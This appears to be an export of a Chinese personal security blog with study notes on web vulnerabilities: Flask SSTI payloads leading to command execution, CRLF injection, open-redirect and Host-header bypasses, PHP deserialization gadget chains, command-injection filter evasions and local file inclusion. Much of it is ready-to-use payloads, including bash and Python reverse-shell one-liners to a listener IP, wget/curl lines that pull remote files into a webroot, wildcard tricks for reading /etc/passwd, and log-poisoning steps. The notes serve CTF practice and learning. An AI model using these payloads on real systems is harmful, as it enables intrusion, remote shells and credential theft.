https://github.com/epinna/tplmap Flask SSTI 及绕过姿势重点看这篇文章：https://zhuanlan.zhihu.com/p/93746437?utm_source=wechat_session CTF题目 Normal SSTI 1234567891011121314151. 使用 ?name&#x3D;&#123;&#123;2*3&#125;&#125; ，页面返回Hello 6, 存在SSTI。2. ?name&#x3D;&#123;&#123;[].__class__&#125;&#125; ，获取类名。3. ?name&#x3D;&#123;&#123;[].__class__.__bases__[0]&#125;&#125;, 获取父类名Object。Java的所有类都是继承自Object。4. ?name&#x3D;&#123;&#123;[].__class__.__bases__[0].__subclasses__()&#125;&#125;, 获取Object类下的所有子类。5. ?name&#x3D;&#123;&#123;[].__class__.__bases__[0].__subclasses__()[0]&#125;&#125;, 调用第一个类，可修改[0]调用其它类。6. 需要使用os._wrap_close类，因为这个类有个popen方法。因此需要知道这个类在Object的子类中位于哪个位置。此时可以使用burp的intruder模块。 ?name&#x3D;&#123;&#123;[].__class__.__bases__[0].__subclasses__()[$0$]&#125;&#125;, 对这个0打上标签，然后payload中选择Number, 填上范围数字。在Options的Grep-Match中添加&#39;os.wrap_close&#39;，（要用引号）点击Add,进行攻击。得到位于117位置。7. ?name&#x3D;&#123;&#123;[].__class__.__bases__[0].__subclasses__()[117].__init__.__globals__[&#39;popen&#39;](&#39;cat+&#x2F;flag&#39;).read()&#125;&#125;, 也可以换成其它命令如：ls &#x2F;等进行RCE。 强网杯2019。 12345678910111213141516?data&#x3D;&#123;&#123;&quot;&quot;|attr(request.args.cla)&#125;&#125;&amp;cla&#x3D;__class__ &#x2F;&#x2F;得到类名?data&#x3D;&#123;&#123;&quot;&quot;|attr(request.args.cla)|attr(request.args.base)&#125;&#125;&amp;cla&#x3D;__class__&amp;base&#x3D;__base__ &#x2F;&#x2F;得到父类名?data&#x3D;&#123;&#123;&quot;&quot;|attr(request.args.cla)|attr(request.args.base)|attr(request.args.sub)()&#125;&#125;&amp;cla&#x3D;__class__&amp;base&#x3D;__base__&amp;sub&#x3D;__subclasses__ &#x2F;&#x2F;得到所有类名&#x2F;&#x2F;要选择哪个魔术方法，不能用[0]或者(0)这样, 需要传getitem进去。?data&#x3D;&#123;&#123;&quot;&quot;|attr(request.args.cla)|attr(request.args.base)|attr(request.args.sub)()|attr(request.args.item)(0)&#125;&#125;&amp;cla&#x3D;__class__&amp;base&#x3D;__base__&amp;sub&#x3D;__subclasses__&amp;item&#x3D;__getitem__ &#x2F;&#x2F;获得第一个子类&#x2F;&#x2F;使用burp进行寻找os._wrap_close的位置。得到127。然后初始化global?data&#x3D;&#123;&#123;&quot;&quot;|attr(request.args.cla)|attr(request.args.base)|attr(request.args.sub)()|attr(request.args.item)(127)|attr(request.args.init)|attr(request.args.glo)&#125;&#125;&amp;cla&#x3D;__class__&amp;base&#x3D;__base__&amp;sub&#x3D;__subclasses__&amp;item&#x3D;__getitem__&amp;init&#x3D;__init__&amp;glo&#x3D;__globals__&#x2F;&#x2F;使用getitem调用popen函数，再通过read读取。得到最终payload：?data&#x3D;&#123;&#123;&quot;&quot;|attr(request.args.cla)|attr(request.args.base)|attr(request.args.sub)()|attr(request.args.item)(127)|attr(request.args.init)|attr(request.args.glo)|attr(request.item)(&#39;popen&#39;)(&#39;whoami&#39;)|attr(request.args.re)&#125;&#125;&amp;cla&#x3D;__class__&amp;base&#x3D;__base__&amp;sub&#x3D;__subclasses__&amp;item&#x3D;__getitem__&amp;init&#x3D;__init__&amp;glo&#x3D;__globals__&amp;re&#x3D;read&#x2F;&#x2F;即可得到whoami的结果。 JustCTF2019 没有链接… 该题适用于日常的渗透测试。用户的输入输出在了页面，通常我们只会去测试明显的那个输入位置。比如：输入了firstname=ggy&amp;secondname=666, 页面输出了hello, ggy。通常只会测试fistname看有没有漏洞。但是后面还有一个参数：firstname=ggy&amp;secondname=666&amp;type=acam.victim.fistname, 前面的fistname不存在漏洞，但是后面的type中的fistname存在。我们发现这个值的格式是：xxx.xxx.xxx，跟SSTI的payload格式一样，只不过很可能它们已经是类名、方法名了。那么可进行测试： type=acam.victim.2 页面返回2.说明存在漏洞。要想像前面的题目一样利用，得知道firstname所在的位置是一个类还是一个方法。那么可以这样： type=acam.victim.to_dict 发现victim是一个方法了，之后就是获取全局变量了。 type=acam.victim.to_dict.__globals__ 页面查找flag即可。 参考文章 https://www.freebuf.com/vuls/83999.html https://cloud.tencent.com/developer/article/1516336","categories":[{"name":"web安全","slug":"web安全","permalink":"https://ggyggy666.github.io/categories/web%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"SSTI服务端模板注入","slug":"SSTI服务端模板注入","permalink":"https://ggyggy666.github.io/tags/SSTI%E6%9C%8D%E5%8A%A1%E7%AB%AF%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/"}],"keywords":[{"name":"web安全","slug":"web安全","permalink":"https://ggyggy666.github.io/categories/web%E5%AE%89%E5%85%A8/"}]},{"title":"CRLF注入漏洞总结","slug":"CRLF注入漏洞总结","date":"2020-07-18T07:10:58.000Z","updated":"2020-07-18T07:21:10.306Z","comments":true,"path":"2020/07/18/CRLF注入漏洞总结/","link":"","permalink":"https://ggyggy666.github.io/2020/07/18/CRLF%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/","excerpt":"","text":"今天总结一下CRLF注入 原理CRLF，CR与LF拼接而成，代表回车和换行：\\r\\n。在URL中使用%0d%0a换行，然后设置HTTP头，如：Location等，从而造成一些危害。 利用方式抓包，在头部的链接后面添加: %0d%0aSet-Cookie: sessionid=1。点击go, 查看返回包中是否有Set-Cookie字段。可能%0d%0a还不行，就试试%0d%0a%0d%0a。 危害会话固定固定一个session: %0d%0aSet-Cookie:JSPSESSID%3Dhackingsite 反射型xss尝试：%0d%0a%0d%0a&lt;img src=1 onerror=alert(/xss/)&gt;，如果对xss有过滤，尝试注入：X-XSS-Protection:0，禁止浏览器过滤。 参考文章 https://cloud.tencent.com/developer/article/1516335","categories":[{"name":"web安全","slug":"web安全","permalink":"https://ggyggy666.github.io/categories/web%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"CRLF注入漏洞总结","slug":"CRLF注入漏洞总结","permalink":"https://ggyggy666.github.io/tags/CRLF%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/"}],"keywords":[{"name":"web安全","slug":"web安全","permalink":"https://ggyggy666.github.io/categories/web%E5%AE%89%E5%85%A8/"}]},{"title":"URL重定向漏洞总结","slug":"URL重定向漏洞总结","date":"2020-07-18T03:45:21.000Z","updated":"2020-07-18T06:58:31.027Z","comments":true,"path":"2020/07/18/URL重定向漏洞总结/","link":"","permalink":"https://ggyggy666.github.io/2020/07/18/URL%E9%87%8D%E5%AE%9A%E5%90%91%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/","excerpt":"","text":"今天总结一下URL跳转及绕过姿势。 原理一个页面中根据用户输入的链接跳转到相应的网页，该网页很可能是攻击者构造的恶意网页，从而欺骗用户的信息。 常见场景 登录后跳转。 用户分享、收藏内容后跳转。 跨站点授权后跳转。 点击站内的链接跳转。 一些用户交互页面如填写评价后跳转。 修改密码、绑定账号后跳转。 绕过姿势源网站是：xxx.com, 要跳转到: baidu.com 12345678?url&#x3D;www.xxx.com@baidu.com?url&#x3D;www.xxx.com.baidu.com?url&#x3D;www.baidu.com?xxx.com?url&#x3D;www.baidu.com#xxx.com?url&#x3D;http:&#x2F;&#x2F;www.evil.com#www.aaa.com?www.aaa.com?url&#x3D;www.baidu.com\\xxx.com?url&#x3D;www.baidu.com\\\\xxx.com?url&#x3D;www.baidu.com&#x2F;www.xxx.com 购买一个域名：?url=www.ggxxx.com 注意满足协议：http, https。 使用百度这种可信任站点：?url=https://www.baidu.com/linkurl=iMwwNDM6ahaxKkSFuOG 使用畸形地址： 123456789?url&#x3D;http:&#x2F;&#x2F;xxx.com&#x2F;%2Fbaidu%252Ecom &#x2F;&#x2F;添加%2F,.两次URL编码成%252E?url&#x3D;&#x2F;www.baidu.com?url&#x3D;&#x2F;&#x2F;www.baidu.com?url&#x3D;&#x2F;&#x2F;&#x2F;www.baidu.com?url&#x3D;&#x2F;&#x2F;&#x2F;www.baidu.com&#x2F;&#x2F;..?url&#x3D;&#x2F;&#x2F;&#x2F;&#x2F;www.baidu.com?url&#x3D;&#x2F;&#x2F;&#x2F;&#x2F;www.baidu.com&#x2F;..?url&#x3D;&#x2F;&#x2F;&#x2F;&#x2F;www.baidu.com&#x2F;&#x2F;..?url&#x3D;http:&#x2F;&#x2F;www.baidu.com\\.xxx.com 使用xip.io ?url=www.xxx.com.220.181.57.217.xip.io 还有短网址。参考SSRF。 其它思路 1234561. 跳转到IP地址，而不是域名;2. 跳转到IPV6地址，而不是IPv4地址;3. 将要跳转到的IP地址用10进制、8进制、16进制形式表示;4. 更换协议,使用ftp、gopher协议等;5. 借鉴SSRF漏洞绕过的tricks;6. CRLF注入不能xss时，转向利用任意URL跳转漏洞;","categories":[{"name":"web安全","slug":"web安全","permalink":"https://ggyggy666.github.io/categories/web%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"URL重定向漏洞总结","slug":"URL重定向漏洞总结","permalink":"https://ggyggy666.github.io/tags/URL%E9%87%8D%E5%AE%9A%E5%90%91%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/"}],"keywords":[{"name":"web安全","slug":"web安全","permalink":"https://ggyggy666.github.io/categories/web%E5%AE%89%E5%85%A8/"}]},{"title":"Host头攻击总结","slug":"Host头攻击总结","date":"2020-07-18T03:20:19.000Z","updated":"2020-07-18T03:44:41.591Z","comments":true,"path":"2020/07/18/Host头攻击总结/","link":"","permalink":"https://ggyggy666.github.io/2020/07/18/Host%E5%A4%B4%E6%94%BB%E5%87%BB%E6%80%BB%E7%BB%93/","excerpt":"","text":"曾经以为Host头不会有什么漏洞，昨日偶然看到一篇文章发现还是有可能存在的，特在此总结一下。 原理一台服务器一个IP，在一台服务器中部署了多个web应用，每个应用服务对应一个域名。通过Host头的值判断传入的数据应该交给哪个应用处理。如果使用的是_SERVER[&quot;HTTP_HOST&quot;]接收Host头的值就很可能存在漏洞。 验证方法 抓包，发送到repeater中，点击go，正常回显。 修改host值，点击go，正常回显。 漏洞存在时的场景 跳转。修改host后，其值出现在返回包中的Location中。 拼接。修改host后，其值出现在标签属性值中，可尝试进行xss。 密码重置污染攻击在重置密码时，会发送一封电子邮件。因此在点击重置密码时，抓包，修改host成自己可控的站点，再点击go。如果正常发送了邮件，那么这封邮件中应该会存在点击一下就能重置得到新密码的功能。但是，由于我们修改了host值，点击一下会发送到我们的站点，很可能URL中会带有用户的key，接收即可。注意，邮件的链接还是原来的正常的链接，只是click me点击一下的这个链接的host值变成我们自己的了。因此可以发送邮件的链接给其他人引诱点击即可。 缓存污染其实就是host值出现在了标签中，可以进行xss弹框或者引入外部的js即：&lt;script src=&quot;http://xxx/js&quot;&gt;&lt;/script&gt;。 绕过姿势 重写Host值。 123GET &#x2F; HTTP&#x2F;1.1Host: example.comHost: www.baidu.com Apache会看所有请求的Host，nginx只看最后一个Host。 增加一个X-Forwarded-Host。 123GET &#x2F; HTTP&#x2F;1.1Host: example.comX-Forwarded-Host: www.baidu.com 可能会根据X-Forwarded-Host指定host。 端口值改成域名 12GET &#x2F; HTTP&#x2F;1.1Host: example.com:@baidu.com 类似绕过重定向那样，会发送到@后面的域名。 利用空格 12GET &#x2F; HTTP&#x2F;1.1Host: example.com: www.baidu.com :与w之间加个空格，可能会绕过黑名单。 参考文章 http://www.vuln.cn/6771 每日漏洞 | Host头攻击 - 简书","categories":[{"name":"web安全","slug":"web安全","permalink":"https://ggyggy666.github.io/categories/web%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"Host头攻击总结","slug":"Host头攻击总结","permalink":"https://ggyggy666.github.io/tags/Host%E5%A4%B4%E6%94%BB%E5%87%BB%E6%80%BB%E7%BB%93/"}],"keywords":[{"name":"web安全","slug":"web安全","permalink":"https://ggyggy666.github.io/categories/web%E5%AE%89%E5%85%A8/"}]},{"title":"PHP反序列化漏洞总结","slug":"PHP反序列化漏洞总结","date":"2020-07-17T08:31:46.000Z","updated":"2020-07-17T09:28:03.644Z","comments":true,"path":"2020/07/17/PHP反序列化漏洞总结/","link":"","permalink":"https://ggyggy666.github.io/2020/07/17/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/","excerpt":"","text":"今天总结一下PHP反序列化漏洞。 原理序列化：对象转成能被存储的数据，反序列则是将数据重新转变成对象。转换的内容是类中的属性，不包括方法。攻击者可根据类新建一个对象再将该对象序列化成数据，然后将这些数据传入，进行反序列化。这个过程本没有漏洞，但是在序列化或者反序列化时会触发一些魔术方法，而这些方法中又使用了echo, eval等危险函数，使得传进来的数据被执行从而造成危害。 相关函数序列化函数：serialize(); 反序列化函数：unserialize(); 魔术方法： __construct(); 构造函数，在创建对象时被触发。 __destruct(); 析构函数，在销毁对象时触发。 __toString(); 在将对象转换成字符串时触发。 __sleep(); 在序列化前触发。 __wakeup(); 在反序列化后触发。 __get(); 在读取不可访问的属性值时触发。 __call(); 在调用未定义的方法时触发。 序列化与反序列化过程 序列化 123456789101112&lt;?phpclass Test&#123; public $a &#x3D; &#39;ThisA&#39;; protected $b &#x3D; &#39;ThisB&#39;; private $c &#x3D; &#39;ThisC&#39;; public function test1()&#123; return&#39;this is test1 &#39;; &#125;&#125;$test &#x3D; new Test();var_dump(serialize($test));?&gt; 创建对象后，使用serialize序列化该对象，然后使用var_dump输出结果，得到： 1string(84) &quot;O:4:&quot;Test&quot;:3:&#123;s:1:&quot;a&quot;;s:5:&quot;ThisA&quot;;s:4:&quot;*b&quot;;s:5:&quot;ThisB&quot;;s:7:&quot;Testc&quot;;s:5:&quot;ThisC&quot;;&#125;&quot; 前面的string(84)忽略。观察结果。O代表对象，4是对象名称的长度，test即对象名（类名）。3表示该对象有3个属性。{}里就是属性。以分号隔开键值对。在属性与属性值前都有：s:x。表示长度。注意号。重点解释：*属性有三种类型，public, protect, private。** public。公有属性。序列化后的属性直接就是本身。如上面的”a”。 protect。保护属性。序列化后的属性是：%00*%00属性名。如上面的：”*b”。%00代表NULL，由于编码原因没显示出来。 private。私有属性。序列化后的属性是：%00类名%00属性名。如上面的：“Testc”。 反序列化 1234&lt;?php $data &#x3D; $_GET[&#39;data&#39;]; var_dump(unserialize($data));?&gt; 接收传进来的数据，注意%00。 1http:&#x2F;&#x2F;118.178.88.139&#x2F;unserialize.php?data&#x3D;O:4:%22Test%22:3:&#123;s:1:%22a%22;s:5:%22ThisA%22;s:4:%22%00*%00b%22;s:5:%22ThisB%22;s:7:%22%00Test%00c%22;s:5:%22ThisC%22;&#125; 将其反序列化后输出得到结果。 1object(__PHP_Incomplete_Class)#1 (4) &#123; [&quot;__PHP_Incomplete_Class_Name&quot;]&#x3D;&gt; string(4) &quot;Test&quot; [&quot;a&quot;]&#x3D;&gt; string(5) &quot;ThisA&quot; [&quot;b&quot;:protected]&#x3D;&gt; string(5) &quot;ThisB&quot; [&quot;c&quot;:&quot;Test&quot;:private]&#x3D;&gt; string(5) &quot;ThisC&quot; &#125; 利用反序列化进行xss将属性值改成：svg/onload=alert(1)。（如果直接加&lt;&gt;，会执行payload得不到结果）进行序列化，然后得到： 1O:4:&quot;Test&quot;:3:&#123;s:1:&quot;a&quot;;s:19:&quot;svg&#x2F;onload&#x3D;alert(1)&quot;;s:4:&quot;*b&quot;;s:5:&quot;ThisB&quot;;s:7:&quot;Testc&quot;;s:5:&quot;ThisC&quot;;&#125; 然后加上&lt;&gt;，注意长度变了，19改成21。还有注意后面加上%00。最后得到： 1http:&#x2F;&#x2F;118.178.88.139&#x2F;unserialize.php?data&#x3D;O:4:%22Test%22:3:&#123;s:1:%22a%22;s:21:%22%3Csvg&#x2F;onload&#x3D;alert(1)%3E%22;s:4:%22%00*%00b%22;s:5:%22ThisB%22;s:7:%22%00Testc%00%22;s:5:%22ThisC%22;&#125; 绕过__wakeup()函数__wakeup()是在反序列化后执行的，但还有更后面执行的destruct()。如果限定死了wakeup，就无法将payload直接传入执行到后面的destruct。因此需要绕过wakeup，不让它执行。（CVE-2016-7124） 反序列化时，如果表示对象属性个数的值大于真实的属性个数时就会绕过。即： 原本的payload： 1O:4:&quot;Test&quot;:3:&#123;s:1:&quot;a&quot;;s:5:&quot;ThisA&quot;;s:4:&quot;*b&quot;;s:5:&quot;ThisB&quot;;s:7:&quot;Testc&quot;;s:5:&quot;ThisC&quot;;&#125; 属性有3个，就显示为：”Test”:3: 。如果改成大于3的数字，如4： 1O:4:&quot;Test&quot;:4:&#123;s:1:&quot;a&quot;;s:5:&quot;ThisA&quot;;s:4:&quot;*b&quot;;s:5:&quot;ThisB&quot;;s:7:&quot;Testc&quot;;s:5:&quot;ThisC&quot;;&#125; 即可绕过。 同名方法的利用123456789101112131415161718192021222324&lt;?php class A&#123; public $target; function __construct()&#123; $this-&gt;target &#x3D; new B; &#125; function __destruct()&#123; $this-&gt;target-&gt;action(); &#125; &#125; class B&#123; function action()&#123; echo &quot;action B&quot;; &#125; &#125; class C&#123; public $test; function action()&#123; echo &quot;action A&quot;; eval($this-&gt;test); &#125; &#125; unserialize($_GET[&#39;test&#39;]);?&gt; 有三个类，类A调用一个函数action。但是类B和类C中都有action函数。类B的action函数没什么用，类C的action函数却有eval函数。因此需要让类A调用C的action函数。那么可以创建一个文件，内容是类A和类C，然后创建A对象再序列化即可： 1234567891011121314151617181920&lt;?php class A&#123; public $target; function __construct()&#123; $this-&gt;target &#x3D; new C; $this-&gt;target-&gt;test &#x3D; &quot;phpinfo();&quot;; &#125; function __destruct()&#123; $this-&gt;target-&gt;action(); &#125; &#125; class C&#123; public $test; function action()&#123; echo &quot;action C&quot;; eval($this-&gt;test); &#125; &#125; echo serialize(new A);?&gt; PHPsession 和 phar看：https://xz.aliyun.com/t/6753#toc-13 或：https://www.cnblogs.com/ichunqiu/p/10484832.html 参考文章 https://www.freebuf.com/articles/web/209975.html https://www.freebuf.com/column/202607.html","categories":[{"name":"web安全","slug":"web安全","permalink":"https://ggyggy666.github.io/categories/web%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"PHP反序列化漏洞总结","slug":"PHP反序列化漏洞总结","permalink":"https://ggyggy666.github.io/tags/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/"}],"keywords":[{"name":"web安全","slug":"web安全","permalink":"https://ggyggy666.github.io/categories/web%E5%AE%89%E5%85%A8/"}]},{"title":"命令执行漏洞总结","slug":"命令执行漏洞总结","date":"2020-07-16T06:31:43.000Z","updated":"2021-03-17T13:36:31.729Z","comments":true,"path":"2020/07/16/命令执行漏洞总结/","link":"","permalink":"https://ggyggy666.github.io/2020/07/16/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/","excerpt":"今天学习并总结命令执行漏洞。","text":"今天学习并总结命令执行漏洞。 原理使用了一些危险函数去执行系统命令，而这些命令用户可控，传输进来后又没做严格过滤，导致执行了一些意料之外的命令。 常见危险函数 漏洞利用 直接执行用户输入的命令 ?cmd=pwd ?cmd=ifconfig等等 ?cmd=cat flag直接查看flag，但注意，这样很可能查看不到，需要经过base64加密：?cmd=cat flag|base64。 使用管道符 ?cmd=127.0.0.1&amp;ifconfig 共有5个可以分隔执行命令的符号。&amp;, &amp;&amp;, |, ||, ;, 当然可能需要编码：%26, %26%26 &amp; 和 | 和 ; 都是一样的，它的左右两边的命令都会执行。 &amp;&amp; 只有当左边命令为true，才会执行右边的命令。 || 只有当左边命令为false，才会执行右边命令。 使用单双引号、反引号闭合 类似SQL注入，如果命令是在引号内是不会被解析的，因此需要闭合。?cmd=127.0.0.1&#39; | ipconfig &#39; 写文件 首先pwd得到路径，然后写入： 123• ?cmd&#x3D;echo&quot;&lt;?php phpinfo()?&gt;&quot; &gt; &#x2F;var&#x2F;www&#x2F;html&#x2F;info.php• ?cmd&#x3D;wget -O &#x2F;var&#x2F;www&#x2F;html&#x2F;info.php http:&#x2F;&#x2F;www.xx.com&#x2F;phpinfo.txt• ?cmd&#x3D;curl http:&#x2F;&#x2F;www.xx.com&#x2F;phpinfo.txt &gt; &#x2F;var&#x2F;www&#x2F;html&#x2F;info.php 常见情况及绕过姿势过滤了空格 使用${IFS}代替：cat${IFS}flag 使用${IFS}$1代替：`cat${IFS}$1flag 使用$IFS$1代替：cat$IFS$1flag 使用重定向符&lt;&gt;代替：cat&lt;&gt;flag 或 cat&lt;flag 使用%09代替：cat%09flag 过滤了目录分割符/可以使用cd进去到那个目录，再cat查看flag。 ;cd flag_is_here;cat flag_279991253520705.php|base64 过滤了|&amp;;可以使用%0a分割命令。 黑名单绕过 a=c;b=at;c=f1;d=ag;$a$b $c$d base64编码：echo &quot;Y2F0IGZsYWc=&quot;|base64 -d 或者 echo &quot;Y2F0IGZsYWc=&quot;|base64 -d|bash 绕过关键字：c&quot;&quot;at fl&#39;&#39;ag 还有 c\\at fl\\ag 和 c$1at fl$@ag.txt cat被过滤时，替代的关键字： 通配符绕过 123456&#x2F;???&#x2F;?[a][t] ?&#39;&#39;?&#39;&#39;?&#39;&#39;?&#39;&#39;&#x2F;???&#x2F;?at flag&#x2F;???&#x2F;?at ????&#x2F;???&#x2F;?[a]&#39;&#39;[t] ?&#39;&#39;?&#39;&#39;?&#39;&#39;?&#39;&#39;读取&#x2F;etc&#x2F;passwd -》 &#x2F;???&#x2F;??t &#x2F;??c&#x2F;p???w? &#x2F;?in&#x2F;cat &#x2F;?tc&#x2F;p?sswd 连接符绕过 使用单引号。 1读取&#x2F;etc&#x2F;passwd: &#x2F;&#39;b&#39;i&#39;n&#39;&#x2F;&#39;c&#39;a&#39;t&#39; &#x2F;&#39;e&#39;t&#39;c&#39;&#x2F;&#39;p&#39;a&#39;s&#39;s&#39;w&#39;d 通配符和连接符具体看这篇文章 内敛执行绕过使用反引号和$()方式。 12echo &quot;xx&#96;pwd&#96;&quot;echo &quot;xx$(pwd)&quot; 绕过长度限制 使用&gt;和&gt;&gt;。&gt;将内容写入到文件，会覆盖原来的内容。&gt;&gt;将内容追加到文件，不会覆盖原有内容。使用\\可以连接命令，使一条命令写在多行。 12345echo &quot;ca\\\\&quot;&gt;cmdecho &quot;t\\\\&quot;&gt;&gt;cmdecho &quot; fl\\\\&quot;&gt;&gt;cmdecho &quot;ag&quot;&gt;&gt;cmd写入文件后，sh cmd执行文件即可执行里面的命令。 还可以创建空文件，使用ls -t将文件名按照创建时间排列出来，排列得到的结果可以写入一个文件作为内容，然后执行即可。 123456&gt; &quot;ag&quot;&gt; &quot;fl\\\\&quot;&gt; &quot;t \\\\&quot;&gt; &quot;ca\\\\&quot;ls -t &gt; a &#x2F;&#x2F;写入a文件中sh a &#x2F;&#x2F;执行a中命令 IP地址转为数字地址127.0.0.1 可转为 2130706433, 直接访问：http://2130706433 转化网站：http://www.msxindl.com/tools/ip/ip_num.asp Linux下反弹shell使用kali的nc kali上，使用nc监听端口。 nc llvp 7777 输入反弹shell命令 bash -i &gt;&amp; /dev/tcp/192.168.0.4/7777 0&gt;&amp;1 IP是kali的IP。 使用python kali上，使用nc监听端口。 nc llvp 7777 使用python去反向连接。 1python -c &quot;import os,socket,subprocess;s&#x3D;socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#39;192.168.0.4&#39;,7777));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p&#x3D;subprocess.call([&#39;&#x2F;bin&#x2F;bash&#39;,&#39;-i&#39;]); 其它两种方法，看这篇文章。 参考文章 https://blog.csdn.net/qq_37133717/article/details/95231291 http://www.ghtwf01.cn/index.php/archives/273/ https://www.freebuf.com/articles/web/185158.html https://www.freebuf.com/articles/web/137923.html https://www.freebuf.com/articles/system/178150.html","categories":[{"name":"web安全","slug":"web安全","permalink":"https://ggyggy666.github.io/categories/web%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"命令执行漏洞总结","slug":"命令执行漏洞总结","permalink":"https://ggyggy666.github.io/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/"}],"keywords":[{"name":"web安全","slug":"web安全","permalink":"https://ggyggy666.github.io/categories/web%E5%AE%89%E5%85%A8/"}]},{"title":"文件包含漏洞总结","slug":"文件包含漏洞总结","date":"2020-07-15T04:13:05.000Z","updated":"2020-07-15T09:23:01.896Z","comments":true,"path":"2020/07/15/文件包含漏洞总结/","link":"","permalink":"https://ggyggy666.github.io/2020/07/15/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/","excerpt":"","text":"今天总结文件包含漏洞。 原理为了让重复的代码不必在不同页面中重复写，将这些代码放到一个文件中，然后在需要用到这些代码时将该文件包含进来即可。包含文件时是通过文件名来定位相应的文件的。如果该文件名用户可控，而且后台没有对传进来的文件名进行严格过滤，就会造成文件包含漏洞。 文件包含函数有4个：include, include_once, require, require_once。 include在遇到错误时继续执行，require则会停止。 无限制本地文件包含通过目录遍历获取系统其它文件内容。 ?file=../../../etc/passwd ../意思是上一级目录，其数量不是确定的。 常见敏感路径Windows系统 123456c:\\boot.ini &#x2F;&#x2F; 查看系统版本c:\\windows\\system32\\inetsrv\\MetaBase.xml &#x2F;&#x2F; IIS配置文件c:\\windows\\repair\\sam &#x2F;&#x2F; 存储Windows系统初次安装的密码c:\\ProgramFiles\\mysql\\my.ini &#x2F;&#x2F; MySQL配置c:\\ProgramFiles\\mysql\\data\\mysql\\user.MYD &#x2F;&#x2F; MySQL root密码c:\\windows\\php.ini &#x2F;&#x2F; php 配置信息 Linux系统 1234567&#x2F;etc&#x2F;passwd &#x2F;&#x2F; 账户信息&#x2F;etc&#x2F;shadow &#x2F;&#x2F; 账户密码文件&#x2F;usr&#x2F;local&#x2F;app&#x2F;apache2&#x2F;conf&#x2F;httpd.conf &#x2F;&#x2F; Apache2默认配置文件&#x2F;usr&#x2F;local&#x2F;app&#x2F;apache2&#x2F;conf&#x2F;extra&#x2F;httpd-vhost.conf &#x2F;&#x2F; 虚拟网站配置&#x2F;usr&#x2F;local&#x2F;app&#x2F;php5&#x2F;lib&#x2F;php.ini &#x2F;&#x2F; PHP相关配置&#x2F;etc&#x2F;httpd&#x2F;conf&#x2F;httpd.conf &#x2F;&#x2F; Apache配置文件&#x2F;etc&#x2F;my.conf &#x2F;&#x2F; mysql 配置文件 包含session文件获取session存储位置 通过phpinfo的session.save_path值获取。 通过默认存储位置，如：Linux放在/var/lib/php/session下。 1234&#x2F;var&#x2F;lib&#x2F;php&#x2F;sess_PHPSESSID&#x2F;var&#x2F;lib&#x2F;php&#x2F;sess_PHPSESSID&#x2F;tmp&#x2F;sess_PHPSESSID&#x2F;tmp&#x2F;sessions&#x2F;sess_PHPSESSID session的文件名格式为：sess_[sessionid]。sessionid在请求时的cookie中可以看到。拼接成文件名后，再加上默认的session存储路径即可包含。 包含Apache日志文件首先访问目标网站时抓包，在http头中添加一句话： 肯定会报错，可能会将一句话写入日志文件中，此时去包含日志文件： ?filename=/var/log/httpd/access.log 也可能是： ?filename=/var/log/apache2/access.log httpd文件夹其它用户没有x权限。 包含SSH log文件默认情况下，SSH log在: /var/log/auth.log 使用ssh连接： 1ubuntu@VM-207-93-ubuntu:~$ ssh &#39;&lt;?php phpinfo(); ?&gt;&#39;@remotehost 之后提示输入密码等，随便输入。然后包含该文件即可。 包含environ文件条件： php以cgi方式运行，这样environ才能保持User-Agent头。 environ文件存储位置已知，且可读。 利用方式： 在user-agent中插入PHP代码，该代码被写入到environ中，直接包含： ?filename=proc/self/environ 包含上传文件或临时文件上传文件后，直接包含。或者，上传文件后会创建临时文件，使用竞争上传，防止被删除从而无法访问临时文件。临时文件目录默认：windows下，在C:\\windows\\temp目录，Linux在/tmp目录。之后就是获取到文件名再包含了。 有限制本地文件包含后台处理中，会将传进来的要包含的文件名与默认后缀拼接构成完整的文件名。比如，要包含test.txt, 但是默认后缀是php, 拼接起来就是：test.txt.php，显然是不存在的。绕过办法： 使用%00截断（仅适用于PHP版本&lt;5.3.4） 还要满足条件：PHPmagic_quotes_gpc=off, 未使用addslashes函数。 ?filename=../../boot.ini%00 路径长度截断 Windows系统路径最长256字节，Linux系统则是4096，超出的部分会被丢弃。 